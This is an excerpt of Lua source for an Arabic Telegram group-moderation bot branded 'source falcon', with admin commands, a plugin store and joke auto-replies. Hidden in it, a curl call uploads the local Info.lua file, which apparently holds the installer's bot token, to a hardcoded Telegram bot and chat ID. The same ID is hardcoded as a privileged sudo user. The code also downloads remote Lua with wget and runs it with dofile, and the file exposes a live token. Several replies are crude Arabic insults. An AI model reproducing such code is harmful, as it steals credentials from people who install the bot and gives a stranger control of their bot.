...
if res ~= 200 then
print('\27[0;31m≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/amrkhaled248/Fallcon/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1050397319,1614314857,}   
...
if tonumber(user_id) == tonumber(1050397319) then  
var = true 
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'صقر هاك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒇𝒂𝒍𝒄𝒐𝒏")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1050397319 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/amrkhaled248/Fallcon/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'𖤐 تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 𖤐 اصدار سورس صقر هاك { s: 6.7}')
end
...
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒇𝒂𝒍𝒄𝒐𝒏️️', url="t.me/source_falcon"}}, 
} 
...
send(msg.chat_id_,0," 𖤐 العضو : {["..data.first_name_.."](T.ME/source_falcon)}\n 𖤐 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 𖤐 عذرا ⇐ {["..data.first_name_.."](T.ME/source_falcon)}\n 𖤐 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[
اهلا بك في سورس صقر هاك🧭
للدخول الي حسابات السورس اتبع الازرار التاليه✅
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطور السورس⚙',url="t.me/Falconhackiiing"}},
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒇𝒂𝒍𝒄𝒐𝒏 🧭 ', url="t.me/source_falcon"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[
 🔆 اهلا بك في سورس صقر هاك الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  🔆 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝓔𝓑 𝓝 𝓗𝓐𝓜𝓞𝓞 𖢑𖤐 ➪ ',url="t.me/Falconhackiiing"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'العاب صقر هاك' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس صقر هاك🚌
...
elseif text == 'قفل صقر هاكرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤐 بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤐 تـم قفـل صقر هاكرسيه ')
end,nil)   
...
elseif text == 'فتح صقر هاكرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤐 بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤐 تـم فـتح صقر هاكرسيه ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/amrkhaled248/Fallcon/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 𖤐 اهلا بك في متجر ملفات صقر هاك\n 𖤐 ملفات السورس ↓\n≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫\n\n"
local TextE = "\n≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫\n 𖤐 علامة تعني { ✔️ } ملف مفعل\n 𖤐 علامة تعني { ✖ } ملف معطل\n 𖤐 قناة سورس صقر هاك ↓\n".." 𖤐 [اضغط هنا لدخول](t.me/source_falcon) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/amrkhaled248/Fallcon/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," 𖤐 عذرا الملف لايدعم سورس صقر هاك \n") 
end
return false
end
...
if text == ("مسح قائمه صقر هاك") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖤐 تم مسح قائمه صقر هاك')
return false
end

if text == 'قائمه صقر هاك' and Sudo(msg) then
...
if #list == 0 then
t = " 𖤐 لا يوجد احد في قائمه صقر هاك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع صقر هاك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع صقر هاك @(.*)$") and Sudo(msg) then
local username = text:match("^رفع صقر هاك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع صقر هاك (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع صقر هاك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل صقر هاك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل صقر هاك @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل صقر هاك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل صقر هاك (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل صقر هاك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'صقر هاك').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'صقر هاك')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس صقر هاك يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'صقر هاك').." غادر" or text == 'غادر' then  
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بيحسدوني لما بضحك 😂😂🔥  ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ احشروو في الانتريه 😂🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ ناموو واللهي 😂🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ وانا كمان واللهي 🌚💘 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ انا كمان حبق قوي 🌚💘 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ بوس براحه يعم 😂😪](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ فرح خالتك قريب 😂🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ انته مال امك 😂🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ غور بوشك ده علي اساس اني بحبك يعني 😒😹 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ اهلا يحبيبي 🌚💖 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ بتنقط ليه يحزين 🥲💚 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ تع شم بصل 🧅😪 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ احا ليك يخول 😎🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ كسمين امك 😂🔥 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ افسح التنين 😂😉 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[  بطل حكك بقي 😂🔥](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ ضيف جهاتك يقلبي 🌚💖 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ في اي 😉💚  ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ بص عدل يحوبي🤟😪 ](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[  هو الخول كان مفكرني انسان 😹😹😪](t.me/source_falcon)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_,  [مين مزعلك بس يقلبي 🌚🥺❤️](t.me/source_falcon) ) 
return false
end
end
end
...
{
{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒇𝒂𝒍𝒄𝒐𝒏', url="t.me/source_falcon"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
🔆الاشعارات
≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫
[𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒇𝒂𝒍𝒄𝒐𝒏](t.me/source_falcon)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local Teext =[[
≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫
اهلا بك في مميزات سورس صقر هاك.🔱
≪━━━━━𝗳𝗮𝗹𝗰𝗼𝗻━━━━━≫
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'صقر هاك')
